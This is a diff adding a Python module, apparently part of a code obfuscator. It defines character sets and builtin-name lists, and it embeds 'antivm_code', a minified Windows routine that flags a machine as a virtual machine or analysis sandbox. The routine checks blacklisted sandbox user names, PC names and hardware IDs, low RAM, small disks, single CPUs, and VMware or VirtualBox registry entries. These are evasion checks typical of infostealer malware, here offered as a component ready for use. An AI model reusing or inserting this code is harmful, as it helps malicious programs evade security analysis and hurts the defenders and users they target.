@@ -1,0 +1,64 @@
+# from string library
+import random
+whitespace = ' \t\n\r\v\f'
+ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
+ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+ascii_letters = ascii_lowercase + ascii_uppercase
+digits = '0123456789'
+ascii_letters_digits = ascii_letters + digits
+hexdigits = digits + 'abcdef' + 'ABCDEF'
+symbols = r"""!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""
+emojis = """😀😁😂🤣😃😄😅😆😉😊😋😎😍😘😗😙😚😜😝😛🤑🤗🤓😎🤡🤠😏😒😞😔😟😕🙁"😣😖😫😩😤😠😡😶😐😑😯😦😧😮😲😵😳😱😨😰😢😥🤤😭😓😪😴🙄🤔🤥😬🤐🤢🤧😷🤒🤕😈👿👹👺💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾👐🙌👏🙏🤝👍👎👊✊🤛🤜🤞✌️🤘👌👈👉👆👇☝️✋🤚🤙🖐🖖👋🤙💪🖕✍️🤳💅🖖💄💋👄👅👂👃👣👁👀🗣👤👥👶👦👧👨👩👱‍♀️👨‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩‍🦰👩‍🦱👩‍🦳👩‍🦲👵👴👲👳‍♀️👳‍♂️👮‍♀️👮‍♂️👷‍♀️👷‍♂️💂‍♀️💂‍♂️🕵️‍♀️🕵️‍♂️👩‍⚕️👨‍⚕️👩‍🌾👨‍🌾👩‍🍳👨‍🍳👩‍🎓👨‍🎓👩‍🎤👨‍🎤👩‍🏫👨‍🏫👩‍🏭👨‍🏭👩‍💻👨‍💻👩‍💼👨‍💼👩‍🔧👨‍🔧👩‍🔬👨‍🔬👩‍🎨👨‍🎨👩‍🚒👨‍🚒👩‍✈️👨‍✈️👩‍🚀👨‍🚀👩‍⚖️👨‍⚖️🤶🎅👸🤴👰🤵👼🤰🙇‍♀️🙇💁💁‍♂️🙅🙅‍♂️🙆🙆‍♂️🙋🙋‍♂️🤦‍♀️🤦‍♂️🤷‍♀️🤷‍♂️🙎🙎‍♂️🙍🙍‍♂️💇💇‍♂️💆💆‍♂️🕴💃🕺👯👯‍♂️🚶‍♀️🚶🏃‍♀️🏃👫👭👬💑👩‍❤️‍👩👨‍❤️‍👨💏👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨👪👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👩‍👩‍👦👩‍👩‍👧👩‍👩‍👧‍👦👩‍👩‍👦‍👦👩‍👩‍👧‍👧👨‍👨‍👦👨‍👨‍👧👨‍👨‍👧‍👦👨‍👨‍👦‍👦👨‍👨‍👧‍👧👩‍👦👩‍👧👩‍👧‍👦👩‍👦‍👦👩‍👧‍👧👨‍👦👨‍👧👨‍👧‍👦👨‍👦‍👦👨‍👧‍👧👚👕👖👔👗👙👘👠👡👢👞👟👒🎩🎓👑⛑🎒👝👛👜💼👓🕶🌂☂️💄💋👣👄👅👂👃👁👀🗣👤👥👶👦👧👨👩👱‍♀️👨‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩‍🦰👩‍🦱👩‍🦳👩‍🦲👴👵👲👳‍♀️👳‍♂️🎓👮‍♀️👮‍♂️🕵️‍♀️🕵️‍♂️👷‍♀️👷‍♂️💂‍♀️💂‍♂️🕵️‍♀️🕵️‍♂️👩‍⚕️👨‍⚕️👩‍🌾👨‍🌾👩‍🍳👨‍🍳👩‍🎓👨‍🎓👩‍🎤👨‍🎤👩‍🏫👨‍🏫👩‍🏭👨‍🏭👩‍💻👨‍💻👩‍💼👨‍💼👩‍🔧👨‍🔧👩‍🔬👨‍🔬👩‍🎨👨‍🎨👩‍🚒👨‍🚒👩‍✈️👨‍✈️👩‍🚀👨‍🚀👩‍⚖️👨‍⚖️🤶🎅👸🤴👰🤵👼🤰🙇‍♀️🙇💁💁‍♂️🙅🙅‍♂️🙆🙆🏻🙆🏼🙆🏽🙆🏾🙆🏿🙅🏻🙅🏼🙅🏽🙅🏾🙅🏿🙋🏻🙋🏼🙋🏽🙋🏾🙋🏿💆🏻💆🏼💆🏽💆🏾💆🏿💇🏻💇🏼💇🏽💇🏾💇🏿👩🏻‍🎓👨🏻‍🎓👩🏻‍💻👨🏻‍💻👩🏻‍🎤👨🏻‍🎤👩🏻‍🎨👨🏻‍🎨👩🏻‍🚒👨🏻‍🚒👩🏻‍✈️👨🏻‍✈️👩🏻‍🚀👨🏻‍🚀👩🏻‍⚖️👨🏻‍⚖️👰🏻‍🎀👸🏻🤴🏻👰🏻🤵🏻👨🏻‍🌾👩🏻‍🌾👨🏻‍🍳👩🏻‍🍳👨🏻‍🎄👩🏻‍🎄🤶🏻🎅🏻👸🏻🤴🏻👰🏻🤵🏻👨🏻‍🎤👩🏻‍🎤👨🏻‍🔧👩🏻‍🔧👨🏻‍🍳👩🏻‍🍳👨🏻‍🔬👩🏻‍🔬👨🏻‍💼👩🎤🦠🎙🔬"""
+inbuilt = [
+    "str", "int", "float", "bool", "list", "dict", "tuple", "set", "bytes", "bytearray", 'hash',
+    "memoryview", "complex", "range", "slice", "hex", "oct", "bin", "chr", "ord", "lambda {0}: {0}".format(random.choice(ascii_letters)),
+    "locals", "globals", "vars", "dir", "eval", "exec", "compile", "repr", "format", "input", "open", "type",
+    'abs', 'help', 'min', 'setattr', 'all', 'hex', 'next', 'any', 'divmod', 'id', 'object', 'sorted', 'ascii',
+    'enumerate', 'input', 'staticmethod', 'classmethod', 'isinstance', 'sum', 'filter', 'issubclass', 'pow',
+    'print', 'callable', 'format', 'len', 'property', 'type', 'frozenset', 'list', 'range', 'vars', 'iter',
+    'locals', 'zip', 'globals', 'map', 'reversed', '__import__', 'hasattr', 'max', 'round', 'delattr', 'getattr',
+    'super',
+]
+replacements = {
+    'True': '(()==())',
+    'False': '(()==[])',
+    'None': 'exec("")',
+}
+
+########################################################################################################################
+
+antivm_code = """D=int
+import os as B,winreg as A,psutil as C,subprocess as F,threading as E
+class G(E.Thread):
+	inVM=(()==[])
+	def __init__(A):
+		C='JOHN-PC';A.processes=list();A.blackListedUsers=['WDAGUtilityAccount','Abby','Peter Wilson','hmarc','patex',C,'RDhJ0CNFevzX','kEecfMwgj','Frank','8Nl0ColNQ5bq','Lisa','John','george','PxmdUOpVyx','8VizSM','w0fjuOVmCcP5A','lmVwjj9b','PqONjHVwexsS','3u2v9m8','Julia','HEUeRzl'];A.blackListedPCNames=['BEE7370C-8C0C-4','DESKTOP-NAKFFMT','WIN-5E07COS9ALR','B30F0242-1C6A-4','DESKTOP-VRSQLAG','Q9IATRKPRH','XC64ZB','DESKTOP-D019GDM','DESKTOP-WI8CLET','SERVER1','LISA-PC',C,'DESKTOP-B0T93D6','DESKTOP-1PYKP29','DESKTOP-1Y2433R','WILEYPC','WORK','6C4E733F-C2D9-4','RALPHS-PC','DESKTOP-WG3MYJS','DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O','QarZhrdBpj','ORELEEPC','ARCHIBALDPC','JULIA-PC','d1bnJkfVlH'];A.blackListedHWIDS=['7AB5C494-39F5-4941-9163-47F54D6D5016','032E02B4-0499-05C3-0806-3C0700080009','03DE0294-0480-05DE-1A06-350700080009','11111111-2222-3333-4444-555555555555','6F3CA5EC-BEC9-4A4D-8274-11168F640058','ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548','4C4C4544-0050-3710-8058-CAC04F59344A','00000000-0000-0000-0000-AC1F6BD04972','79AF5279-16CF-4094-9758-F88A616D81B4','5BD24D56-789F-8468-7CDC-CAA7222CC121','49434D53-0200-9065-2500-65902500E439','49434D53-0200-9036-2500-36902500F022','777D84B3-88D1-451C-93E4-D235177420A7','49434D53-0200-9036-2500-369025000C65','B1112042-52E8-E25B-3655-6A4F54155DBF','00000000-0000-0000-0000-AC1F6BD048FE','EB16924B-FB6D-4FA1-8666-17B91F62FB37','A15A930C-8251-9645-AF63-E45AD728C20C','67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3','C7D23342-A5D4-68A1-59AC-CF40F735B363','63203342-0EB0-AA1A-4DF5-3FB37DBB0670','44B94D56-65AB-DC02-86A0-98143A7423BF','6608003F-ECE4-494E-B07E-1C4615D1D93C','D9142042-8F51-5EFF-D5F8-EE9AE3D1602A','49434D53-0200-9036-2500-369025003AF0','8B4E8278-525C-7343-B825-280AEBCD3BCB','4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27']
+		for D in [A.listCheck,A.registryCheck,A.specsCheck]:B=E.Thread(target=D,daemon=(()==()));A.processes.append(B);B.start()
+		for F in A.processes:
+			try:F.join()
+			except RuntimeError:continue
+	def programExit(A):A.__class__.inVM=(()==())
+	def listCheck(A):
+		for D in ['D:\\\\Tools','D:\\\\OS2','D:\\\\NT3X']:
+			if B.path.exists(D):A.programExit()
+		for E in A.blackListedUsers:
+			if B.getlogin()==E:A.programExit()
+		for G in A.blackListedPCNames:
+			if B.getenv('COMPUTERNAME')==G:A.programExit()
+		try:C=F.check_output('wmic csproduct get uuid',creationflags=0x08000000).decode().split('\\n')[1].strip()
+		except Exception:C=''
+		for H in A.blackListedHWIDS:
+			if C==H:A.programExit()
+	def specsCheck(A):
+		if D(str(C.virtual_memory()[0]/1024**3).split('.')[0])<=2:A.programExit()
+		if D(str(C.disk_usage('/')[0]/1024**3).split('.')[0])<=50:A.programExit()
+		if D(C.cpu_count())<=1:A.programExit()
+	def registryCheck(C):
+		E=B.system('REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\DriverDesc 2> nul');F=B.system('REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\ProviderName 2> nul')
+		if(E and F)!=1:C.programExit()
+		D=A.OpenKey(A.HKEY_LOCAL_MACHINE,'SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\Enum')
+		try:
+			G=A.QueryValueEx(D,'0')[0]
+			if('VMware'or'VBOX')in G:C.programExit()
+		finally:A.CloseKey(D)
+"""
